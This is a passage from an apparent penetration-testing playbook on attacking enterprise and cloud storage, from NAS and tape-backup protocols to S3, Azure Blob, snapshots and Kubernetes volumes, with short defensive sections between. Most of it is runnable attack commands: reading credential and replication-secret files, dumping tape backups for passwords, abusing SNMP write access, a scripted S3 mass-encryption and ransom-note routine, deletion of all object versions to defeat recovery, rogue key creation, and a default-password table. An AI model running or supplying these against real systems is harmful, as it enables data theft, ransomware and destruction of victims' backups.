  -d 'api=SYNO.API.Auth&version=3&method=login&account=admin&passwd=REPLACE_WITH_YOUR_PASSWORD&session=FileStation&format=sid'

# After login: list shares
SID=REPLACE_WITH_YOUR_SID
curl -k "https://10.0.0.5:5001/webapi/entry.cgi?api=SYNO.FileStation.List&version=2&method=list&_sid=$SID"
```

#### 6.8.2 Extract S3 Sync Credentials

```bash
# After SSH or web shell access:
sudo cat /etc/synology/s3.conf
# Reveals: access_key, secret_key, endpoint for cloud sync targets
```

### 6.9 TrueNAS / FreeNAS

```bash
# TrueNAS middleware REST API
curl -k -u admin:REPLACE_WITH_YOUR_PASSWORD \
  https://10.0.0.5/api/v2.0/core/system_info

# List SMB shares
curl -k -u admin:REPLACE_WITH_YOUR_PASSWORD \
  https://10.0.0.5/api/v2.0/sharing/smb/

# List datasets
curl -k -u admin:REPLACE_WITH_YOUR_PASSWORD \
  https://10.0.0.5/api/v2.0/pool/dataset/
```

---

## 7. NDMP Attacks

NDMP (Network Data Management Protocol) runs on TCP 10000 and is used by backup servers to drive tape libraries. Many appliances ship with cleartext authentication and weak defaults.

### 7.1 Discovery

```bash
# Sweep for NDMP
nmap -p 10000 --open 10.0.0.0/24 -sV

# Probe NDMP version
echo -ne '\x00\x00\x00\x1c\x00\x00\x00\x01\x00\x00\x00\x02\x00\x00\x00\x0c\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00' | \
  nc 10.0.0.5 10000 | xxd
```

### 7.2 Default Credential Test

```bash
# Common defaults: backup/backup, ndmp/ndmp, root/(empty)
# Use ndmp-utils or a Python NDMP client
python3 -c "
from ndmp import NDMP
n = NDMP('10.0.0.5', 10000)
print(n.connect(auth_type=0, user='backup', password='backup'))
print(n.get_state())
"
```

### 7.3 Tape Backup Pilfering

```bash
# List active tape sessions
python3 -c "
from ndmp import NDMP
n = NDMP('10.0.0.5', 10000)
n.connect(auth_type=0, user='backup', password='backup')
print(n.notify_data_hold())
print(n.tape_get_state())
print(n.mover_get_state())
"

# Dump a tape backup to local file (read-only)
ndmpcopy -s backup/backup -d /tmp/tape_dump 10.0.0.5:10000 SESSION_ID

# Parse dump for embedded DB credentials
strings /tmp/tape_dump | grep -E 'password|conn|oracle|sa@'
```

### 7.4 Defensive Detection — NDMP

```bash
# Enable MD5 or SHA auth
# NetApp: options ndmpd.enable on; options ndmpd.password <user> <pass>
# Restrict NDMP to backup server IPs
iptables -A INPUT -p tcp --dport 10000 -s 10.0.0.99 -j ACCEPT
iptables -A INPUT -p tcp --dport 10000 -j DROP
```

---

## 8. Management Plane Attacks (SMI-S / SNMP)

### 8.1 SMI-S Enumeration

SMI-S (Storage Management Initiative Specification) is a WBEM/CIM-based standard for cross-vendor storage management.

```bash
# SMI-S typically on HTTPS 5988 (cleartext) or 5989 (TLS)
nmap -p 5988,5989 --open 10.0.0.0/24

# Use wbemcli to enumerate SMI-S objects
wbemcli -noverbose -nl https://10.0.0.5:5989 \
  -user admin -password REPLACE_WITH_YOUR_PASSWORD \
  'https://10.0.0.5:5989/root/emc:Clar_StorageVolume'

# Generic SMI-S object enumeration via pywbem
python3 -c "
import pywbem
conn = pywbem.WBEMConnection('https://10.0.0.5:5989',
                             ('admin', 'REPLACE_WITH_YOUR_PASSWORD'),
                             default_namespace='root/cimv2')
for cls in conn.EnumerateClassNames():
    print(cls)
for inst in conn.EnumerateInstances('CIM_StorageVolume'):
    print(inst['ElementName'], inst.items())
"
```

### 8.2 SNMP Storage MIBs

```bash
# snmpwalk against common vendor MIB OIDs
# NetApp = .1.3.6.1.4.1.789
snmpwalk -v2c -c public 10.0.0.5 .1.3.6.1.4.1.789 | head -100

# Dell EMC = .1.3.6.1.4.1.1981
snmpwalk -v2c -c public 10.0.0.5 .1.3.6.1.4.1.1981 | head -100

# Pure Storage = .1.3.6.1.4.1.25461
snmpwalk -v2c -c public 10.0.0.5 .1.3.6.1.4.1.25461 | head -100

# Synology = .1.3.6.1.4.1.6574
snmpwalk -v2c -c public 10.0.0.5 .1.3.6.1.4.1.6574 | head -100

# QNAP = .1.3.6.1.4.1.24681
snmpwalk -v2c -c public 10.0.0.5 .1.3.6.1.4.1.24681 | head -100

# Generic host resources (LUN topology)
snmpwalk -v2c -c public 10.0.0.5 .1.3.6.1.2.1.25 | head -50
```

### 8.3 SNMP RW Community Abuse

```bash
# Test for RW community (default patterns: private, readwrite, admin)
for comm in public private readwrite admin storage; do
  echo "=== community $comm ==="
  snmpset -v2c -c $comm 10.0.0.5 \
    .1.3.6.1.2.1.1.6.0 s "pwned-location" 2>&1
done

# If write succeeds: you have array reconfiguration ability
# Use snmpwalk to extract admin contacts (often phone/email)
snmpwalk -v2c -c private 10.0.0.5 .1.3.6.1.2.1.1.4
```

### 8.4 Defensive Detection — SNMP

```bash
# Disable SNMPv1/v2c; require SNMPv3 authPriv
# NetApp:
options snmp.enable on
options snmp.access host=10.0.0.99
options snmp.communities comm=REPLACE_WITH_NEW_COMMUNITY

# SNMPv3 user
snmpusm -v3 -u REPLACE_WITH_USER -l authPriv \
  -a SHA -A REPLACE_WITH_AUTH_PASS -x AES -X REPLACE_WITH_PRIV_PASS \
  10.0.0.5 createUser newadmin
```

---

## 9. Replication / Sync Attacks

### 9.1 DRDR Secret Theft

DRBD replicates block devices between nodes using a shared secret. Capture it from a compromised node.

```bash
# On a compromised DRBD node:
sudo cat /etc/drbd.d/global_common.conf | grep -A2 'shared-secret'
# Sample: shared-secret "REPLACE_WITH_YOUR_DRBD_SECRET";

# On an attacker-controlled node: join the cluster
sudo drbdadm create-md r0
sudo drbdadm up r0
# Use the stolen secret in /etc/drbd.d/r0.res on the attacker side
```

### 9.2 rsync over SSH Trust

```bash
# Check rsync daemon (TCP 873)
nmap -p 873 --open 10.0.0.0/24

# List rsync modules (no auth)
rsync rsync://10.0.0.5/

# Pull files from an unauth module
rsync -av rsync://10.0.0.5/data/ /tmp/rsync_loot/

# Check rsyncd.conf for secrets file (often world-readable)
#   on the rsync server: cat /etc/rsyncd.secrets
```

### 9.3 SAN-to-SAN Replication Abuse (NetApp SnapMirror)

```bash
# SnapMirror relationship enumeration (NetApp)
ssh admin@10.0.0.5 'snapmirror show -fields source-path,destination-path,schedule'

# If attacker controls destination: alter source to capture a foreign volume
ssh admin@10.0.0.5 'snapmirror initialize -source-path svm1:vol1 -destination-path svm2:vol1_copy'
```

### 9.4 Pure Storage ActiveCluster / Replication

```bash
# List replication connections
curl -k -H "Authorization: Bearer $TOKEN" \
  https://10.0.0.5/api/1.0/array?connection=true

# List pod replica links
curl -k -H "Authorization: Bearer $TOKEN" \
  https://10.0.0.5/api/1.1/pods
```

---

## 10. Ransomware Patterns

This section documents ransomware patterns observed against storage appliances. **Use ONLY with explicit engagement authorization for ransomware simulation.**

### 10.1 NAS Ransomware Recon

```bash
# Shodan-style internet recon (DO NOT execute against third parties)
# QNAP exposed admin (port 8080):
#   https://www.shodan.io/search?query=qnap+port%3A8080
# Synology DSM (port 5000/5001):
#   https://www.shodan.io/search?query=synology+port%3A5000

# In-scope engagement: fingerprint appliance
nmap -p 8080,5000,5001,80,443 --script=http-title 10.0.0.0/24

# Probe for DSM version
curl -sk https://10.0.0.5:5001/webapi/query.cgi?api=SYNO.API.Info | jq

# Probe for QTS version
curl -sk https://10.0.0.5:8080/cgi-bin/quick/quick.cgi?func=firmware_version
```

### 10.2 DeadBolt Pattern

```bash
# Pattern: internet-facing QNAP admin console, default creds, mass-encrypt SMB shares

# Phase 1: Initial access (assume authorized)
curl -k -X POST 'https://10.0.0.5:8080/cgi-bin/quick/quick.cgi' \
  -d 'user=admin&password=REPLACE_WITH_YOUR_PASSWORD&act=login'

# Phase 2: Mount each SMB share and write a marker file
for share in public backup data; do
  mkdir -p /mnt/smb/$share
  mount -t cifs //10.0.0.5/$share /mnt/smb/$share -o username=admin,password=REPLACE_WITH_YOUR_PASSWORD
  # Ransomware simulation: write a marker file (NOT actual encryption)
  echo 'AUTHORIZED TEST MARKER' > /mnt/smb/$share/READ_THIS.txt
done

# Phase 3: Demonstrate mass-encryption capability (WRITE ONLY in scope)
#   - Iterate share contents
#   - Replace each file with a marker-stub
#   - Replace file extension to .deadbolt
find /mnt/smb -type f -name '*.txt' | head -5 | while read f; do
  echo 'SIMULATED ENCRYPTION - REPLACE_WITH_YOUR_AUTHORIZATION' > "$f.deadbolt"
  # rm "$f"  # NEVER run destructive commands without explicit auth
done
```

### 10.3 eCh0raix Pattern

```bash
# Pattern: QNAP + Synology, exploiting vulnerable apps (Photo Station, Surveillance Station)
# Test for vulnerable app versions
curl -sk 'https://10.0.0.5:8080/photo/' | grep -i version
curl -sk 'https://10.0.0.5:8080/cgi-bin/photo/cgi/quick.cgi?func=version' | jq
```

### 10.4 S3 Mass-Encrypt Pattern

```bash
# Pattern: attacker with one over-privileged IAM role mass-encrypts every object

# Phase 1: enumerate all buckets the role can see
aws s3api list-buckets --profile REPLACE_WITH_YOUR_PROFILE | jq '.Buckets[].Name'

# Phase 2: for each bucket, list objects
for bucket in $(aws s3api list-buckets --profile REPLACE_WITH_YOUR_PROFILE | jq -r '.Buckets[].Name'); do
  aws s3api list-objects-v2 --bucket "$bucket" --profile REPLACE_WITH_YOUR_PROFILE | \
    jq -r '.Contents[].Key' >> /tmp/all_keys.txt
done

# Phase 3: download, encrypt, re-upload (SIMULATED - DO NOT run on real data)
while read key; do
  bucket=$(echo "$key" | cut -d: -f1)
  object=$(echo "$key" | cut -d: -f2-)
  aws s3 cp "s3://$bucket/$object" /tmp/obj --profile REPLACE_WITH_YOUR_PROFILE
  # SIMULATED encryption — replace with engagement-approved encryption command
  # openssl enc -aes-256-cbc -in /tmp/obj -out /tmp/obj.enc -k REPLACE_WITH_YOUR_KEY
  aws s3 cp /tmp/obj.enc "s3://$bucket/$object.enc" --profile REPLACE_WITH_YOUR_PROFILE
done < /tmp/all_keys.txt

# Phase 4: drop ransom note
echo 'SIMULATION: This bucket was mass-encrypted as part of an authorized test.' > /tmp/RANSOM.txt
aws s3 cp /tmp/RANSOM.txt s3://REPLACE_WITH_BUCKET_NAME/RANSOM.txt --profile REPLACE_WITH_YOUR_PROFILE
```

### 10.5 Defensive Detection — Ransomware

```bash
# Enable S3 Object Lock (compliance mode) — prevents overwrite of existing objects
aws s3api put-object-retention \
  --bucket REPLACE_WITH_BUCKET_NAME \
  --key target.txt \
  --retention '{ "Mode": "COMPLIANCE", "RetainUntilDate": "2027-01-01T00:00:00" }'

# CloudTrail alert on mass PutObject
aws logs filter-log-events \
  --log-group-name AWSCloudTrail \
  --filter-pattern '{ $.eventName = "PutObject" }' \
  --start-time $(date -d '1 hour ago' +%s)000

# NetApp: enable ransomware protection (autonomous ransomware protection)
ssh admin@netapp 'volume arp-on -vserver svm1 -volume vol1'

# Synology: enable Immutability + Snapshot retention
# DSM GUI: Control Panel > Snapshot Replication > Immutability
```

### 10.6 Backup Resilience Test

```bash
# Verify that backups are actually restorable (common gap: backup exists but cannot restore)
# Restore a NetApp snapshot to a test LUN
ssh admin@netapp 'volume snapshot restore -vserver svm1 -volume vol1 -snapshot hourly.2024-06-01_0000'

# Restore an S3 object version
aws s3api get-object \
  --bucket REPLACE_WITH_BUCKET_NAME \
  --key target.txt \
  --version-id REPLACE_WITH_VERSION_ID \
  restored.txt

# Restore an Azure Blob from soft delete
az storage blob restore --account-name REPLACE_WITH_ACCOUNT \
  --container-name REPLACE_WITH_CONTAINER \
  --name target.txt \
  --deleted-blob-version REPLACE_WITH_VERSION
```

---

## Appendix A: Quick Reference — Default Credentials

> Use only on in-scope appliances. Replace `REPLACE_WITH_YOUR_PASSWORD` with the engagement target's actual default or discovered password.

| Vendor / Product | Default User | Default Password | Source |
|------------------|-------------|------------------|--------|
| NetApp ONTAP (older) | admin | (empty) | ONTAP 8.x docs |
| NetApp ONTAP 9.x | admin | REPLACE_WITH_YOUR_PASSWORD (installer-set) | ONTAP install |
| Dell EMC VNX/Unity | admin | admin / Password123! | EMC Unity install |
| Dell EMC VNX | nasadmin | nasadmin | VNX docs |
| Dell EMC CLARiiON | sysadmin | sysadmin | legacy |
| Pure Storage | admin | pure (older) / installer-set | Purity install |
| HPE Nimble | admin | admin | Nimble OS install |
| Hitachi VSP | administrator | (initial password from HDS) | VSP install |
| IBM Spectrum Scale | root | REPLACE_WITH_YOUR_PASSWORD | GPFS docs |
| QNAP QTS | admin | admin | QNAP factory default |
| Synology DSM 6.x | admin | admin | DSM 6.x factory default |
| Synology DSM 7.x | (installer-set) | (installer-set) | DSM 7.x forces change |
| TrueNAS / FreeNAS | admin | admin (older) / root (FreeNAS) | iXsystems docs |
| NDMP backup daemons | backup | backup | legacy convention |
| SNMP RW community | (none) | private / readwrite | legacy convention |

## Appendix B: Storage Port Reference

| Protocol | Default Port |
|----------|-------------|
| iSCSI | 3260/tcp |
| iSNS | 3205/tcp |
| FCIP | 3225/tcp |
| Fibre Channel | 24/FCoE (ethertype 0x8906) |
| NFS | 2049/tcp, 2049/udp |
| SMB/CIFS | 445/tcp, 139/tcp |
| AFP | 548/tcp |
| RPCbind | 111/tcp, 111/udp |
| NDMP | 10000/tcp |
| SMI-S WBEM | 5988/tcp (http), 5989/tcp (https) |
| SNMP | 161/udp |
| S3 / MinIO | 80, 443, 9000/tcp |
| Azure Blob | 443/tcp |
| GCP Cloud Storage | 443/tcp |
| OpenStack Swift | 8080/tcp, 5000/tcp (auth) |
| NetApp ONTAP REST | 443/tcp |
| NetApp ZAPI | 443/tcp |
| Dell EMC Unity REST | 443/tcp |
| Dell EMC Naviseccli | 2162/tcp (mgmt) |
| Pure Storage REST | 443/tcp |
| HPE Nimble REST | 5392/tcp |
| QNAP QTS web | 8080/tcp |
| Synology DSM web | 5000/tcp (http), 5001/tcp (https) |
| TrueNAS web | 80/tcp, 443/tcp |

## Appendix C: NSE Script Quick Reference

```bash
# iSCSI
nmap -p 3260 --script=iscsi-info,iscsi-brute 10.0.0.5

# NFS
nmap -p 111,2049 --script=nfs-ls,nfs-showmount,nfs-statfs,rpcinfo 10.0.0.5

# SMB
nmap -p 445 --script=smb-enum-shares,smb-enum-users,smb-os-discovery,smb2-security-mode,smb-vuln-ms17-010 10.0.0.5

# SNMP
nmap -p 161 --script=snmp-info,snmp-processes,snmp-interfaces,snmp-win32-services,snmp-brute 10.0.0.5

# NDMP
nmap -p 10000 --script=ndmp-version,ndmp-auth 10.0.0.5

# HTTP (appliance admin)
nmap -p 80,443,5000,5001,8080 --script=http-title,http-enum,http-methods,http-default-accounts 10.0.0.5
```

---

## 11. Azure Blob Deep Dive

Azure Blob Storage is distinct from S3-compatible storage. Attackers must use Azure-specific APIs.

### 11.1 Account Enumeration

```bash
# Check if account exists
curl -sI https://REPLACE_WITH_ACCOUNT.blob.core.windows.net/ | head -5
#   200 = exists
#   404 = does not exist (AccountNotFound)

# Check if account allows public access
curl -s https://REPLACE_WITH_ACCOUNT.blob.core.windows.net/?comp=list | xmllint --format -
#   If list of containers returned without auth: account allows public blob access
```

### 11.2 Container Discovery

```bash
# Brute-force container names
for name in public private backup data archive container container1 container2 blob; do
  echo "=== $name ==="
  curl -sI "https://REPLACE_WITH_ACCOUNT.blob.core.windows.net/${name}?restype=container" | head -2
done

# List blobs in a known public container
curl -s "https://REPLACE_WITH_ACCOUNT.blob.core.windows.net/REPLACE_WITH_CONTAINER?restype=container&comp=list" | \
  xmllint --format - | grep -E '<Name>|<Url>'

# Recursive list with prefix + marker (pagination)
curl -s "https://REPLACE_WITH_ACCOUNT.blob.core.windows.net/REPLACE_WITH_CONTAINER?restype=container&comp=list&prefix=secret&maxresults=1000"
```

### 11.3 SAS Token Abuse

Shared Access Signatures (SAS) are pre-authorized URLs. Stolen SAS tokens grant their scope.

```bash
# Test if a SAS token is still valid
curl -sI "https://REPLACE_WITH_ACCOUNT.blob.core.windows.net/REPLACE_WITH_CONTAINER/file.txt?sv=2020-08-04&ss=bfqt&srt=sco&sp=rwdlacuptfx&se=2027-01-01T00:00:00Z&st=2024-01-01T00:00:00Z&spr=https&sig=REPLACE_WITH_YOUR_SIG"

# If valid, list everything the SAS permits
curl -s "https://REPLACE_WITH_ACCOUNT.blob.core.windows.net/REPLACE_WITH_CONTAINER?restype=container&comp=list&sv=2020-08-04&ss=bfqt&...&sig=REPLACE_WITH_YOUR_SIG"

# Brute-force SAS token scope (very slow, but sometimes the token is over-scoped)
# Try sp=rwdl (read/write/delete/list) — if SAS was sp=rl only, will 403
```

### 11.4 Azure CLI

```bash
# Login with service principal
az login --service-principal -u REPLACE_WITH_APP_ID -p REPLACE_WITH_PASSWORD --tenant REPLACE_WITH_TENANT_ID

# List storage accounts
az storage account list -o table

# List containers in an account
az storage container list --account-name REPLACE_WITH_ACCOUNT --auth-mode login

# List blobs in a container
az storage blob list --account-name REPLACE_WITH_ACCOUNT \
  --container-name REPLACE_WITH_CONTAINER --auth-mode login

# Download all blobs
az storage blob download-batch --account-name REPLACE_WITH_ACCOUNT \
  --source REPLACE_WITH_CONTAINER --destination ./out --auth-mode login
```

### 11.5 Defensive Detection — Azure Blob

```bash
# Require secure transfer (HTTPS only)
az storage account update --name REPLACE_WITH_ACCOUNT --https-only true

# Disable public blob access at account level (post-2020 accounts default off)
az storage account update --name REPLACE_WITH_ACCOUNT --allow-blob-public-access false

# Enable soft delete
az storage blob service-properties delete-policy update \
  --account-name REPLACE_WITH_ACCOUNT --enable true --days-retained 30

# Enable versioning
az storage blob service-properties versioning enable \
  --account-name REPLACE_WITH_ACCOUNT

# Container-level immutability policy
az storage container immutability-policy create \
  --account-name REPLACE_WITH_ACCOUNT \
  --container-name REPLACE_WITH_CONTAINER \
  --period 30 --policy-mode locked
```

---

## 12. GCP Cloud Storage Deep Dive

### 12.1 Bucket Discovery

```bash
# Check if bucket exists
curl -sI https://storage.googleapis.com/REPLACE_WITH_BUCKET_NAME/ | head -3

# List bucket (anonymous)
curl -s "https://storage.googleapis.com/REPLACE_WITH_BUCKET_NAME/?max-keys=1000" | xmllint --format -

# Download object (anonymous)
curl -s "https://storage.googleapis.com/REPLACE_WITH_BUCKET_NAME/REPLACE_WITH_OBJECT" -o /tmp/obj
```

### 12.2 gcloud CLI

```bash
# Login with service account key
gcloud auth activate-service-account --key-file=/path/to/key.json

# List buckets
gcloud storage ls

# List objects
gcloud storage ls gs://REPLACE_WITH_BUCKET_NAME/

# Sync bucket to local
gcloud storage cp -r gs://REPLACE_WITH_BUCKET_NAME/* ./out/
```

### 12.3 HMAC Key Abuse

```bash
# List HMAC keys
gcloud storage hmac list

# Create a rogue HMAC key (if attacker has permissions)
gcloud storage hmac create REPLACE_WITH_SERVICE_ACCOUNT_EMAIL
```

### 12.4 Defensive Detection — GCS

```bash
# Enable uniform bucket-level access
gcloud storage buckets update gs://REPLACE_WITH_BUCKET_NAME --uniform-bucket-level-access

# Enable Bucket Lock
gcloud storage buckets update gs://REPLACE_WITH_BUCKET_NAME \
  --retention-period=30d

# Enable versioning
gcloud storage buckets update gs://REPLACE_WITH_BUCKET_NAME --versioning

# Audit log alerts on mass deletion
gcloud logging metrics create gcs-mass-delete \
  --log-filter='resource.type="gcs_bucket" AND protoPayload.methodName="storage.objects.delete"'
```

---

## 13. iSER / NVMe-oF Attacks

### 13.1 iSER (iSCSI Extensions for RDMA)

iSER uses RDMA (InfiniBand or RoCE) to bypass TCP/IP for iSCSI. The auth model is the same as TCP iSCSI.

```bash
# Discover iSER targets (same as iSCSI, but on RDMA interface)
iscsiadm -m discovery -t sendtargets -p 10.0.0.5

# Use RDAC (RDMA-aware) transport
iscsiadm -m node -T <iqn> -p 10.0.0.5 --op update \
  -n node.transport_name -v iser

# Login
iscsiadm -m node -T <iqn> -p 10.0.0.5 -l
```

### 13.2 NVMe-oF (TCP/FC/RDMA)

NVMe-oF uses DH-HMAC-CHAP for authentication. Misconfigurations allow unauth discovery.

```bash
# Install nvme-cli
sudo apt install -y nvme-cli

# Discover NVMe-oF TCP targets
sudo nvme discover -t tcp -a 10.0.0.5 -s 4420

# Connect without DH-HMAC-CHAP (if target allows)
sudo nvme connect -t tcp -n REPLACE_WITH_NQN -a 10.0.0.5 -s 4420

# List connected NVMe devices
sudo nvme list

# Read NVMe controller info
sudo nvme id-ctrl /dev/nvme0

# Test DH-HMAC-CHAP brute-force (vendor-specific; often not exposed to network)
# Requires the target to enforce DH-HMAC-CHAP
```

### 13.3 Defensive Detection — NVMe-oF

```bash
# Pure Storage: enable DH-HMAC-CHAP
purehost connect --host REPLACE_WITH_HOST --iscsi-iptarget 10.0.0.5 --chap REPLACE_WITH_USER:REPLACE_WITH_SECRET

# Linux target: enforce DH-HMAC-CHAP in /etc/nvme/config.json
#   "hostnqn": "nqn.2024-08.com.example:host1",
#   "hostid": "REPLACE_WITH_HOST_UUID",
#   "subsystemnqn": "nqn.2024-08.com.example:sub1",
#   "dhchap_key": "DHHC-1:01:REPLACE_WITH_YOUR_KEY..."
```

---

## 14. SAS / SCSI Attacks

Serial Attached SCSI (SAS) is rarely exposed to network, but is relevant when attacking physical access scenarios.

### 14.1 SAS Expander Enumeration

```bash
# Install sg3_utils (provides smp_utils)
sudo apt install -y smp-utils sg3-utils

# Query SAS expander
smp_discover_list /dev/bsg/expander-0:0:0

# Read SAS phys (reveals attached devices)
smp_read_gpio /dev/bsg/expander-0:0:0
```

### 14.2 SCSI General Attacks

```bash
# SCSI INQUIRY (reveals vendor, model, firmware)
sg_inq /dev/sdb

# SCSI REPORT LUNS
sg_luns /dev/sdb

# Read capacity
sg_readcap /dev/sdb

# Send MODE SENSE (reveals caching, error recovery)
sg_modes /dev/sdb

# Send LOG SENSE (reveals error counters — often leaked vendor data)
sg_logs /dev/sdb
```

### 14.3 Defensive Detection — SAS

SAS defenses are primarily physical:
- Encrypt all SAS-attached disks (SED: Self-Encrypting Drive)
- Use multi-factor authentication for physical data center access
- Sanitize retired disks per NIST SP 800-88

---

## 15. AFP / Legacy File Protocol Attacks

### 15.1 AFP (Apple Filing Protocol)

AFP runs on TCP 548 and is still exposed on some multi-protocol NAS appliances.

```bash
# Install afp client
sudo apt install -y netatalk

# Enumerate AFP server
afpstatus 10.0.0.5

# Connect with guest credentials
mount_afp afp://;guest@10.0.0.5/data /mnt/afp

# Connect with known credentials
mount_afp afp://user:REPLACE_WITH_YOUR_PASSWORD@10.0.0.5/data /mnt/afp
```

### 15.2 NetWare Core Protocol (NCP)

NCP is legacy but appears in some long-lived deployments.

```bash
# Install ncpfs
sudo apt install -y ncpfs

# Enumerate NCP server
ncplist -S 10.0.0.5

# Login as guest
ncplogin -S 10.0.0.5 -U guest -P ''
```

### 15.3 Defensive Detection — Legacy Protocols

Disable AFP and NCP unless required by legacy clients. Both lack modern security primitives:
- AFP supports Kerberos but many deployments use clear-text auth
- NCP has known crypto weaknesses (the original NetWare crypto was broken in the 1990s)

---

## 16. Storage Snapshot Abuse

Snapshots are a backup primitive on most arrays. An attacker with array admin can:
1. Restore a snapshot to recover deleted files (data archaeology)
2. Delete snapshots to defeat ransomware recovery
3. Modify snapshot schedules to create gaps in protection

### 16.1 NetApp Snapshot Discovery

```bash
# List snapshots on a volume
ssh admin@netapp 'volume snapshot show -vserver svm1 -volume vol1'

# Restore a snapshot (data archaeology — recover deleted files)
ssh admin@netapp 'volume snapshot restore -vserver svm1 -volume vol1 -snapshot hourly.2024-01-01_0000'

# Delete a snapshot (ransomware prep — defeat recovery)
ssh admin@netapp 'volume snapshot delete -vserver svm1 -volume vol1 -snapshot hourly.2024-06-01_0000'
```

### 16.2 Pure Storage Snapshot Discovery

```bash
# List snapshots
curl -k -H "Authorization: Bearer $TOKEN" \
  https://10.0.0.5/api/1.0/volume?snap=true

# Restore a snapshot
curl -k -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"source":"REPLACE_WITH_SNAP_ID","overwrite":true}' \
  https://10.0.0.5/api/1.0/volume/REPLACE_WITH_VOLUME_ID
```

### 16.3 Dell EMC Snapshot Discovery

```bash
# Via Naviseccli
/opt/Navisphere/bin/naviseccli -h 10.0.0.5 \
  -user nasadmin -password nasadmin \
  snapshot -list -allowedhosts

# Restore snapshot to a new LUN
/opt/Navisphere/bin/naviseccli -h 10.0.0.5 \
  -user nasadmin -password nasadmin \
  snapshot -restore -id REPLACE_WITH_SNAP_ID -res REPLACE_WITH_NEW_LUN_ID
```

### 16.4 S3 Object Version Restoration

```bash
# List versions of an object
aws s3api list-object-versions \
  --bucket REPLACE_WITH_BUCKET_NAME \
  --prefix target.txt

# Restore a specific version
aws s3api get-object \
  --bucket REPLACE_WITH_BUCKET_NAME \
  --key target.txt \
  --version-id REPLACE_WITH_VERSION_ID \
  restored.txt

# Delete all versions (anti-forensic)
aws s3api list-object-versions \
  --bucket REPLACE_WITH_BUCKET_NAME \
  --prefix target.txt | \
  jq -r '.Versions[] | "--key " + .Key + " --version-id " + .VersionId' | \
  xargs -L 1 aws s3api delete-object --bucket REPLACE_WITH_BUCKET_NAME
```

### 16.5 Defensive Detection — Snapshot Abuse

```bash
# NetApp: enable Snapshot Lock (immutable snapshots)
ssh admin@netapp 'volume snapshot policy modify -vserver svm1 -policy default -enabled true'
ssh admin@netapp 'volume snapshot modify -vserver svm1 -volume vol1 -snapshot hourly.2024-06-01_0000 -snaplock-expiry-time 2027-01-01T00:00:00Z'

# Pure Storage: SafeMode snapshots
purevol snap --snap-suffix safemode --vol vol1 --no-dedup --retention 30d

# AWS S3: Object Lock (compliance mode)
aws s3api put-object-retention \
  --bucket REPLACE_WITH_BUCKET_NAME \
  --key target.txt \
  --retention '{ "Mode": "COMPLIANCE", "RetainUntilDate": "2027-01-01T00:00:00" }'
```

---

## 17. Storage Fabric Recon (Deep)

### 17.1 Brocade Fabric Discovery

```bash
# SSH to fabric switch
ssh admin@10.0.0.99

# Show fabric topology
foscmd "topology show"

# Show all WWNs in fabric
foscmd "nsshow"

# Show active zones
foscmd "zoneshow"
foscmd "cfgshow"

# Show fabric OS version
foscmd "version"
```

### 17.2 Cisco MDS Fabric Discovery

```bash
# SSH to MDS switch
ssh admin@10.0.0.99

# Show fabric topology
show topology
show fcsie

# Show all WWNs in VSAN
show fcns database vsan 1
show flogi database vsan 1

# Show active zoneset
show zoneset active vsan 1
```

### 17.3 Fabric Attack Surface

```bash
# Check if fabric is in interop mode (weaker security)
foscmd "fabriname --show"
#   interop_mode = 1 = weaker

# Check default zone behavior
foscmd "defzone --show"
#   defzone = allaccess = CRITICAL (all initiators see all targets)

# Check for promiscuous zones
foscmd "zoneshow" | grep -E 'member.*\*'
#   '*' indicates wildcards in zone members
```

---

## 18. Storage Hypervisor Attacks (VMware vSAN, etc.)

### 18.1 vSAN Discovery

```bash
# vSAN runs on port 443 (vCenter) and 2233 (vSAN agent)
nmap -p 443,2233 --open 10.0.0.0/24

# RVC (Ruby vSphere Console) for vSAN
rvc administrator@vsphere.local@vcenter.example.com
#   > cd /localhost/datacenters/dc1/computers/cluster1
#   > vsan.disaster_recovery.info
```

### 18.2 vSAN Disk Attack

```bash
# Identify vSAN disk groups via esxcli
ssh root@esxi.example.com 'esxcli vsan storage list'

# Dump vSAN disk content (if mounted locally on ESXi)
ssh root@esxi.example.com 'vsish -e get /vmkModules/lsom/disks/naa.5000c5008e1a7b3c/info'
```

### 18.3 Hyper-V Storage Spaces

```powershell
# List storage pools
Get-StoragePool

# List virtual disks
Get-VirtualDisk

# List physical disks
Get-PhysicalDisk
```

### 18.4 Defensive Detection — Storage Hypervisor

vSAN and Storage Spaces Direct inherit the underlying hypervisor's security posture:
- Patch vCenter / ESXi / Hyper-V host within 30 days
- Enable vSAN encryption at-rest
- Use vSphere Trust Authority for attestation
- Isolate vSAN network from user VLANs

---

## 19. Cloud-Native Storage Attacks

### 19.1 Kubernetes Persistent Volumes (CSI)

```bash
# Identify PVs and PVCs
kubectl get pv,pvc --all-namespaces

# Identify CSI drivers (vendor plugins)
kubectl get csidriver,csinode --all-namespaces

# Read CSI secrets (if exposed via ServiceAccount)
kubectl get secrets --all-namespaces | grep -i csi

# If CSI secret compromised: read PV data directly via CSI API
# (vendor-specific; e.g., for EBS CSI, use aws ec2 describe-volumes)
```

### 19.2 Container Storage Interface (CSI) Driver Abuse

```bash
# Common CSI drivers
#   EBS CSI (AWS) — exposes EC2 volume management
#   Azure Disk CSI — exposes Azure disk management
#   GCE PD CSI — exposes GCE persistent disk management
#   Portworx CSI — exposes PX-Enterprise management
#   Longhorn — exposes Longhorn UI

# Longhorn UI (often exposed in-cluster)
kubectl port-forward -n longhorn-system svc/longhorn-frontend 8080:80
# Visit http://localhost:8080 — full admin UI

# Portworx REST API (often exposed in-cluster)
curl http://portworx-service:9001/v1/volumes
```

### 19.3 Defensive Detection — Cloud-Native Storage

```bash
# Restrict CSI secret access via RBAC
#   apiVersion: rbac.authorization.k8s.io/v1
#   kind: Role
#   metadata:
#     namespace: kube-system
#     name: csi-restricted
#   rules:
#   - apiGroups: [""]
#     resources: ["secrets"]
#     resourceNames: ["csi-aws-ebs"]
#     verbs: ["get"]

# Network policy: restrict Longhorn UI to admin namespace
#   apiVersion: networking.k8s.io/v1
#   kind: NetworkPolicy
#   ...
```

---

## 20. Storage Data Loss Prevention (DLP) Bypass

### 20.1 Steganography over SMB

```bash
# Embed a payload inside a benign file via steghide
steghide embed -cf /mnt/smb/benign.png -ef /tmp/payload.exe -p REPLACE_WITH_YOUR_PASSWORD -sf /mnt/smb/benign_modified.png

# Extract on the receiving end
steghide extract -sf /mnt/smb/benign_modified.png -p REPLACE_WITH_YOUR_PASSWORD -xf /tmp/payload.exe
```

### 20.2 DNS Tunneling over Object Storage

```bash
# Upload small chunks via S3 PutObject, encode key as DNS query
